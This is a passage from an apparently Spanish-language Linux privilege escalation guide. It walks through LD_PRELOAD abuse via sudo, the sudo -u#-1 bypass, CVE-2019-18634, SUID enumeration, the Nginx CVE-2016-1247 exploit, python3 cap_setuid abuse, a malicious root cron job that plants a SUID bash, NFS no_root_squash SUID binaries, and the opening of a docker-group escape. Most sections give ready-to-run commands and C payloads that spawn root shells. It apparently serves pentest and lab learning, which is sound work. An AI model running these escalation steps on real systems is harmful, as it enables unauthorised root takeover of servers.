highlighter-rouge">0</code>, o sea el del usuario <code class="language-plaintext highlighter-rouge">root</code> y, para finalizar, que la instrucci√≥n a ejecutar sea lanzar una shell <code class="language-plaintext highlighter-rouge">/bin/bash</code>:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">void</span> <span class="nf">_init</span><span class="p">(){</span>
	<span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
	<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Este archivo debe ser compilado para obtener el binario como tal. Para ello podemos ejecutar la siguiente instrucci√≥n, utilizando el compilador <code class="language-plaintext highlighter-rouge">gcc</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> &lt;binary-name&gt;.so &lt;payload-name&gt;.c <span class="nt">-nostartfiles</span>

<span class="c"># Example</span>
gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> shell.so shell.c <span class="nt">-nostartfiles</span>
</pre></table></code></div></div><p>De esta manera al ejecutar SUDO, indicando el nuevo valor de la variable de entorno <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code>, ejecutaremos la <code class="language-plaintext highlighter-rouge">/bin/bash</code> que nosotros definimos en el binario:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">sudo </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>&lt;path&gt;/&lt;binary-name&gt;.so &lt;binary-sudo&gt;

<span class="c"># Example</span>
<span class="nb">sudo </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/home/sha-16/shell.so /usr/bin/whoami
</pre></table></code></div></div><h2 id="sudo-1827---security-bypass">Sudo 1.8.27 - Security Bypass</h2><p>El a√±o 2019 se encontr√≥ una forma de evadir la denegaci√≥n de ejecutar un comando con <code class="language-plaintext highlighter-rouge">root</code> mediante <code class="language-plaintext highlighter-rouge">sudo</code>. Para checar esto se pod√≠a ejecutar <code class="language-plaintext highlighter-rouge">sudo -l</code>, el cual deb√≠a mostrar la siguiente l√≠nea en el output:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>&lt;user&gt; <span class="nv">ALL</span><span class="o">=(</span>ALL,!root<span class="o">)</span> /bin/bash

<span class="c"># Example</span>
sha-16 <span class="nv">ALL</span><span class="o">=(</span>ALL,!root<span class="o">)</span> /bin/bash
</pre></table></code></div></div><p>B√°sicamente esta configuraci√≥n indica que puedes ejecutar el comando <code class="language-plaintext highlighter-rouge">/bin/bash</code>, por medio de <code class="language-plaintext highlighter-rouge">sudo</code>, con cualquier usuario, excepto con <code class="language-plaintext highlighter-rouge">root</code><strong>.</strong></p><p>Entonces para evadir dicha medida, y lograr ejecutar el comando con el usuario <code class="language-plaintext highlighter-rouge">root</code> de igual forma, se pod√≠a indicar la siguiente sentencia y escalar privilegios en el servidor:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
</pre></table></code></div></div><p><strong>Vulnerabilidad en ExploitDB</strong>: <a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass - Linux local Exploit</a></p><h2 id="sudo-version--1826-cve-2019-18634">Sudo Version &gt; 1.8.26 (<strong>**CVE-2019-18634</strong>**)</h2><p>Es una vulnerabilidad de SUDO se presenta cuando la configuraci√≥n <em>pwfeedfack</em> se encuentra habilitado en el archivo <code class="language-plaintext highlighter-rouge">/etc/sudoers</code>. Gracias a esto los usuarios con privilegios SUDO pueden explotar un desbordamiento de buffer e inyectar instrucciones en el contexto del otro usuario por medio del programa ejecutado.</p><p>Para explotar la vulnerabilidad podemos utilizar el siguiente exploit: <a href="https://github.com/saleemrashid/sudo-cve-2019-18634">https://github.com/saleemrashid/sudo-cve-2019-18634</a></p><p>Dado que es un archivo escrito en C, debemos compilarlo para generar el binario de la siguiente manera:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc <span class="nt">-o</span> exploit exploit.c
</pre></table></code></div></div><p>Una vez compilado, quedar√≠a solo ejecutarlo en el sistema vulnerable:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./exploit
</pre></table></code></div></div><p><strong>TryHackMe Lab to exploit this vuln:</strong> <a href="https://tryhackme.com/room/sudovulnsbof">TryHackMe - Sudo Buffer Overflow</a></p><hr /><h1 id="suid-permissions">SUID Permissions</h1><p>Los permisos SUID son privilegios que nos permiten ejecutar un archivo o binario en el contexto del usuario propietario del mismo. Esto significa que si tenemos un binario con permisos SUID y el propietario es <code class="language-plaintext highlighter-rouge">root</code>, al ejecutarlo lo estaremos haciendo en el contexto del usuario <code class="language-plaintext highlighter-rouge">root</code> y no con el que tenemos nuestra sesi√≥n actual.</p><p>Al ser as√≠, existen varias formas de aprovecharlos para encontrar vectores de ataque que nos pueden permitir escalar privilegios en el servidor, o pivotar de usuario en el sistema.</p><p>Estas las puedes encontrar detalladas en la plataforma <a href="http://gtfobins.github.io/">GTFOBins</a>.</p><p>Para enumerar archivos, o binarios, con permisos SUID, podemos ejecutar cualquiera de las dos opciones que se presentan a continuaci√≥n:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null 

<span class="c"># You can look their privileges</span>
find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-ls</span> 2&gt;/dev/null
</pre></table></code></div></div><p>Lo suyo es checar cada binario para saber si es que pueden ser una v√≠a potencial de escalaci√≥n de privilegios.</p><p>Habr√°n veces en las que vamos a tener en frente binarios con permisos SUID que no conozcamos y que incluso no se encuentren en GTFOBins.</p><p>Ante esto tenemos distintas opciones a considerar:</p><ul><li>Monitorear el comportamiento del binario al ejecutarse con <code class="language-plaintext highlighter-rouge">strace</code> (filtra operaciones <code class="language-plaintext highlighter-rouge">open</code>, <code class="language-plaintext highlighter-rouge">access</code> o <code class="language-plaintext highlighter-rouge">No such file‚Ä¶</code>; con esto pondremos buscar las dependencias que utiliza el mismo aplicativo para ver si las podemos ‚Äúsuplantar‚Äù).<li>Aplicar t√©cnicas de reversing sobre el binario con <code class="language-plaintext highlighter-rouge">ghidra</code>.<li>Enumerar el contenido legible del binario con el comando <code class="language-plaintext highlighter-rouge">strings</code> (buscar de credenciales hardcodeadas, dependencias del binario, archivos, etc).</ul><p>La idea de esto es poder encontrar alguna v√≠a potencial para explotar Buffer Overflow, PATH Hijacking o Library Hijacking y lograr escalar privilegios en el servidor.</p><hr /><h1 id="nginx-privilege-escalation-cve-2016-1247">Nginx Privilege Escalation (CVE-2016-1247)</h1><p>Esta es una vulnerabilidad que se presenta s√≥lo en algunas versiones paquetes de Nginx:</p><ul><li>Anterior a <strong>1.6.2-5+deb8u3</strong> en <strong>Debian jessie</strong>,<li>Anterior a <strong>1.4.6-1ubuntu3.6</strong> en <strong>Ubuntu 14.04 LTS</strong>.<li>Anterior a <strong>1.10.0-0ubuntu0.16.04.3</strong> en <strong>Ubuntu 16.04 LTS</strong>.<li>Anterior a <strong>1.10.1-0ubuntu1.1</strong> en <strong>Ubuntu 16.10</strong>.</ul><p>La vulnerabilidad es generada a partir de una configuraci√≥n incorrecta de permisos en los logs de Nginx que permite a un usuario, due√±o del servidor web (<code class="language-plaintext highlighter-rouge">www-data</code>), crear un enlace simb√≥lico que apunte hacia una biblioteca compartida creada y controlada por el atacante para aprovechar el misconfiguration y ser ejecutada una vez se arranque, o reinicie, el servidor web.</p><p>Para checar las versiones de los paquetes de Nginx instalados en el servidor puedes ejecutar el siguiente comando:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dpkg <span class="nt">-l</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"nginx"</span>
</pre></table></code></div></div><p>Es de suma importancia checar que tenemos los respectivos privilegios asignados de manera incorrecta en los logs del servidor web:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ld</span> /var/log/nginx/<span class="k">*</span>
<span class="nt">-rw-r-----</span> 1 www-data adm         0 Nov 12 22:31 /var/log/nginx/access.log
<span class="nt">-rw-r--r--</span> 1 root     root    0 Nov 12 22:47 /var/log/nginx/error.log
</pre></table></code></div></div><p>De todas maneras puedes explotar esto m√°s r√°pido, ejecutando el script que se adjunta en el siguiente enlace: <a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247</a>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">chmod</span> +x nginxed-root.sh
<span class="nv">$ </span>/nginxed-root.sh /var/log/nginx/error.log
</pre></table></code></div></div><hr /><h1 id="abusing-capabilities">Abusing Capabilities</h1><p>Se podr√≠a decir que son privilegios del usuario <code class="language-plaintext highlighter-rouge">root</code> fragmentados que se establecen para ejecutar binarios, o archivos, en determinados contextos puntuales. En si evitan que el usuario que los ejecuta asuma la identidad de <code class="language-plaintext highlighter-rouge">root</code>. Permiten asignar permisos de una forma mucho m√°s selectiva, lo cual de por si lo hace mucho m√°s seguro que los permisos SUID.</p><p>Las capabilities tal como su nombre lo indican son ciertas capacidades que le podemos brindar a un binario/archivo para ser ejecutado, en un determinado contexto, como el usuario <code class="language-plaintext highlighter-rouge">root</code>, sin abarcar la totalidad del proceso.</p><p>Sin embargo, existen ciertos misconfigurations que nos pueden permitir abusar de algunas capabilities para escalar privilegios en el servidor.</p><p>Antes de ahondar m√°s en los misconfigurations, es importante mencionar que existen 3 flags para asignar capabilities: <strong>P (Permitted)</strong>, <strong>E (Effective</strong>) e <strong>I (Inheritable)</strong>:</p><ul><li><strong>Permitted (p):</strong> Este flag establece que el binario puede invocar esa capabilitie al momento de ser ejecutado.<li><strong>Effective (e):</strong> Este flag permite representar todo el conjunto efectivo de capabilities que el proceso est√° utilizando. Con esto se evita emitir llamadas especiales en el sistema.<li><strong>Inhertitable (i):</strong> Este flag permite determinar si el proceso al que se asignan los privilegios es extensible o no a procesos hijos.</ul><p>Si no entendiste la descripci√≥n anterior, te dejo el siguiente fragmento que a lo mejor te puede ayudar a entenderlo mejor:</p><blockquote><p><em>‚ÄúEn esencia, asignando a un fichero una capability con flags E y P se puede decir que el proceso derivado en la ejecuci√≥n tendr√° esa capability sin hacerla extensible a los posibles procesos hijos.‚Äù</em> - Incibe-Cert</p></blockquote><p>Bueno, una vez tenemos una buena idea de lo que son las capabilities, podemos ir a los comandos.</p><p>Primeramente, si quieres enumerar capabilities, lo suyo ser√≠a utilizar al comando <code class="language-plaintext highlighter-rouge">getcap</code> de la siguiente forma:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>getcap <span class="nt">-r</span> / 2&gt;/dev/null
</pre></table></code></div></div><p>De esta manera, realizaremos una b√∫squeda recursiva de binarios y archivos con capabilties en el sistema operativo.</p><p>Una capabilitie muy com√∫n de aprovechar es: <code class="language-plaintext highlighter-rouge">CAP_SETUID</code>, la cual nos permite ejecutar el binario en el contexto de otro usuario a partir del UID que establezcamos al momento de ejecutarlo.</p><p>Por ejemplo: Tenemos al int√©rprete de <code class="language-plaintext highlighter-rouge">python3</code> con esta capabilitie como se muestra a continuaci√≥n:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/python3 <span class="o">=</span> cap_setuid+ep
</pre></table></code></div></div><p>Esto es un misconfiguration y nos permitir√° escalar privilegios, ya que con python3 podemos ejecutar c√≥digo a nivel de sistema, definiendo el UID del usuario que deseemos impersonar.</p><p>Para escalar privilegios podemos ejecutar el siguiente comando:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/python3 <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.system('/bin/bash');"</span>
</pre></table></code></div></div><p>La ejecuci√≥n de dicho comando importar√° el m√≥dulo de sistema <code class="language-plaintext highlighter-rouge">os</code>, que nos permitir√° establecer el UID <code class="language-plaintext highlighter-rouge">0</code>, del usuario <code class="language-plaintext highlighter-rouge">root</code>, y luego de esto, se ejecutar√° una orden de sistema que ser√≠a una shell <code class="language-plaintext highlighter-rouge">/bin/bash</code> en el contexto del usuario definido en la funci√≥n <code class="language-plaintext highlighter-rouge">setuid</code> a partir de su identificador.</p><p>Si tienes capabilties asignadas en tu servidor, puedes revisar el recurso <a href="https://gtfobins.github.io/">GTFOBins</a> donde se muestran distintas formas de abusar de algunas de estas para escalar privilegios.</p><hr /><h1 id="cron-jobs">Cron Jobs</h1><p>Las tareas cron, tal como su nombre lo indican, son procesos que se ejecutan en el sistema de forma programada.</p><p>Estas son ejecutadas en segundo plano por el usuario asignado para ello.</p><p>Existen distintas formas de configurar tareas cron, una es a trav√©s del programa <code class="language-plaintext highlighter-rouge">crontab</code>, otra es por medio del archivo <code class="language-plaintext highlighter-rouge">/etc/crontab</code>, tambi√©n se pueden programar mediante los archivos contenidos dentro de los directorios y subdirectorios de <code class="language-plaintext highlighter-rouge">/etc/cron/</code>.</p><p>La estructura de una tarea cron es la siguiente:</p><p><img data-proofer-ignore data-src="http://kamilslab.com/wp-content/uploads/2016/09/cron-e1473900135807.png" alt="Cron Jobs Structure" /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c"># Example: </span>
<span class="c"># Cron: Execute backups with root user on every friday of month at 00:00</span>
0 0 <span class="k">*</span> <span class="k">*</span> 4 root /root/backups/backup.sh
</pre></table></code></div></div><p>Es importante mencionar que existen temporizadores preestablecidos que permiten programar la ejecuci√≥n de las tareas con palabras:</p><ul><li><strong>@reboot:</strong> Se ejecuta s√≥lo una vez (nada m√°s iniciarse el equipo).<li><strong>@yearly:</strong> Se ejecuta s√≥lo una vez al a√±o: <em>*0 0 1 1 **</em>.<li><strong>@monthly:</strong> Se ejecuta una vez al mes y el primer d√≠a a las 12 de la noche: <em>*0 0 1 * **</em>.<li><strong>@weekly:</strong> Todas las semanas, el primer minuto de la primer hora de la semana: <strong>0 0 * * 0</strong>.<li><strong>@daily: T</strong>odos los d√≠as a las 12 de la noche: <em>*0 0 * * **</em>.<li><strong>@midnight:</strong> Tiene el mismo efecto que el anterior.<li><strong>@hourly: T</strong>odas las horas durante su primer minuto: <em>*0 * * * **</em>.</ul><p>Si a√∫n no sabes bien c√≥mo leer cron jobs, te recomiendo utilizar este recurso que te permitir√° traducirlas y conocer sus respectivos significados: <a href="https://crontab.guru/">Crontab.guru</a></p><p>De esta forma, si de seguridad hablamos, podemos abusar de cron jobs si:</p><ul><li>Tenemos permisos de escritura, o alguna forma de modificar, archivos de Cron (ej: <code class="language-plaintext highlighter-rouge">/etc/crontab</code>).<li>Tenemos privilegios de escritura en los archivos o binarios que se ejecutan a partir de los cron jobs.<li>Tenemos la capacidad de intervenir en los procesos que se ejecutan con Cron (ej: podemos modificar un archivo que se ejecuta a partir de la ejecuci√≥n de un binario con cron).<li>Tenemos la capacidad de modificar alg√∫n archivo <code class="language-plaintext highlighter-rouge">crontab</code> de otro usuario.</ul><p>Por ejemplo, si tenemos permisos de escritura en el archivo <code class="language-plaintext highlighter-rouge">/etc/crontab</code> lo suyo ser√≠a la siguiente secuencia de comandos para escalar privilegios:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c"># Create a malicious file</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'cp /bin/bash /tmp/bash &amp;&amp; chmod 4755 /tmp/bash'</span> <span class="o">&gt;</span> /tmp/privesc.sh 
<span class="nv">$ </span><span class="nb">chmod</span> +x /tmp/privesc.sh

<span class="c"># Add evil cron job to /etc/crontab</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'* * * * * root /tmp/privesc.sh'</span> <span class="o">&gt;&gt;</span> /etc/crontab

<span class="c"># Wait a minute and you will get root by executing the next command</span>
/tmp/bash <span class="nt">-p</span> 
</pre></table></code></div></div><h2 id="process-monitoring">Process Monitoring</h2><p>Una buena t√©cnica de enumeraci√≥n es la monitorizaci√≥n de procesos con la herramienta <a href="https://github.com/DominicBreuker/pspy">Pspy</a></p><p>Podemos descargar uno de los <a href="https://github.com/DominicBreuker/pspy/releases">releases</a>, de acuerdo a la arquitectura de nuestro sistema operativo, y ejecutarlo de la siguiente manera para comenzar a ver los procesos que se ejecutan en tiempo real:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># x86</span>
<span class="nb">chmod</span> +x pspy32
./pspy32

<span class="c"># x86_x64</span>
<span class="nb">chmod</span> +x pspy64
./pspy64 
</pre></table></code></div></div><p>Una alternativa para esto, puede ser crear un script en bash usando la herramienta <code class="language-plaintext highlighter-rouge">ps</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">oldProcess</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span><span class="p">;</span>

<span class="k">while </span><span class="nb">true</span><span class="p">;</span>
<span class="k">do
        </span><span class="nv">newProcess</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> <span class="nb">command</span><span class="si">)</span><span class="p">;</span>
        diff &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$oldPrcess</span><span class="s2">"</span><span class="o">)</span> &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$newProcess</span><span class="s2">"</span><span class="o">)</span> | <span class="nb">grep</span> <span class="s2">"[</span><span class="se">\&gt;\&lt;</span><span class="s2">]"</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"procmon.sh|command"</span><span class="p">;</span>
        <span class="nv">oldProcess</span><span class="o">=</span><span class="nv">$newProcess</span><span class="p">;</span>
				<span class="nb">sleep </span>4<span class="p">;</span>
<span class="k">done</span>
</pre></table></code></div></div><p>La idea de la monitorizaci√≥n de procesos es recopilar informaci√≥n sobre los archivos o binarios que se est√°n ejecutando en segundo plano, qu√© usuario lo est√° haciendo y cada cu√°nto.</p><p>Dado esto, es importante checar si es que tenemos alg√∫n tipo de privilegio importante sobre los ejecutables de las tareas, checar si podemos alterar el contenido de los mismos, o incluso verificar si es que podemos concatenar su explotaci√≥n con otra vulnerabilidad.</p><hr /><h1 id="privilege-escalation-via-nfs-root-squashing">Privilege Escalation via NFS Root Squashing</h1><p>Network File System (NFS) es un protocolo de comunicaci√≥n, usado com√∫nmente para compartir archivos a trav√©s de la red. Este protocolo al ser configurado de forma incorrecta, podr√≠a permitir que los usuarios locales del servidor escalen privilegios dentro del mismo.</p><h2 id="identificaci√≥n-de-recursos-compartidos-v√≠a-nfs">Identificaci√≥n de recursos compartidos v√≠a NFS</h2><p>Por defecto NFS se ejecuta en el puerto 2049, el cual puede ser asequible de forma remota (si es que as√≠ se configura) a trav√©s del comando <code class="language-plaintext highlighter-rouge">showmount</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>showmount <span class="nt">-e</span> &lt;ip&gt;
</pre></table></code></div></div><p>De la misma manera, las carpetas compartidas pueden ser enumeradas localmente a trav√©s del archivo <code class="language-plaintext highlighter-rouge">/etc/exports</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat</span> /etc/exports
</pre></table></code></div></div><h2 id="nfs-vulnerables">NFS Vulnerables</h2><p>Cuando un recurso compartido tiene habilitada la opci√≥n <code class="language-plaintext highlighter-rouge">no_root_squash</code>, significa que dentro de los recursos compartidos se podr√°n realizar cambios utilizando m√°ximos privilegios de <code class="language-plaintext highlighter-rouge">root</code>.</p><p>De esta manera debemos considerar dos cosas para escalar privilegios:</p><ul><li>El recurso tiene habilitada la opci√≥n <code class="language-plaintext highlighter-rouge">no_root_squash</code> en el fichero <code class="language-plaintext highlighter-rouge">/etc/exports</code>.<li>El recurso es asequible de forma remota desde otros dispositivos de la red.</ul><p>Esto √∫ltimo nos permitir√° crear una montura del mismo en nuestro servidor local de atacantes.</p><p>De esta manera, lo primero que debemos realizar es una montura del mismo recurso compartido en nuestro servidor local, para ello podemos ejecutar la siguiente secuencia de comandos:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">mkdir</span> /mnt/nfs_mount
mount <span class="nt">-o</span> rw,vers<span class="o">=</span>2 <span class="nt">-l</span> nfs &lt;ip&gt;:&lt;share-resource&gt; /mnt/nfs_mount
</pre></table></code></div></div><p>Luego de realizar la montura, podemos proseguir con la siguiente secuencia de comandos, que nos permitir√° crear y compilar un binario SUID que al ser ejecutado por el usuario de sistema le entregue una shell de bash con el usuario <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /mnt/nfs_mount/
<span class="nb">echo</span> <span class="s1">'int main(){ setuid(0); system("/bin/bash"); return 0; }'</span> <span class="o">&gt;</span> privesc.c
gcc privesc.c <span class="nt">-o</span> privesc
<span class="nb">chmod </span>4755 privesc
</pre></table></code></div></div><p>Luego de realizar esto, volvemos al usuarios de bajos privilegios en el servidor y ejecutamos el binario que hemos a√±adido al recurso compartido:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./privesc
</pre></table></code></div></div><p>Una vez hecho esto, seremos <code class="language-plaintext highlighter-rouge">root</code> y habremos escalado privilegios en el servidor.</p><hr /><h1 id="privilege-escalation-via-docker-group">Privilege Escalation via Docker Group</h1><p>Si el usuario de tu sesi√≥n actual se encuentra en el grupo <code class="language-plaintext highlighter-rouge">docker</code> tienes una v√≠a de escalaci√≥n de privilegios en el servidor.</p><p>Para ello debes ejecutar la siguiente secuencia de comandos:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="c"># Server Session:</span>
<span class="c"># Con este comando podr√°s ver si tu usuario est√° en el grupo "docker".</span>
<span class="nv">$ </span><span class="nb">id</span>

<span class="c"># Con este comando obtendr√°s las imagenes de Docker</span>
<span class="c"># que est√°n instaladas en el servidor.</span>
<span class="nv">$ </span>docker images

<span class="c"># Con este comando lo que har√°s ser√°:</span>
<span class="c"># 1. Arrancar un contenedor a partir de una imagen instalada en el host.</span>
<span class="c"># 2. Montar la ra√≠z del servidor padre dentro del directorio /mnt del contenedor. </span>
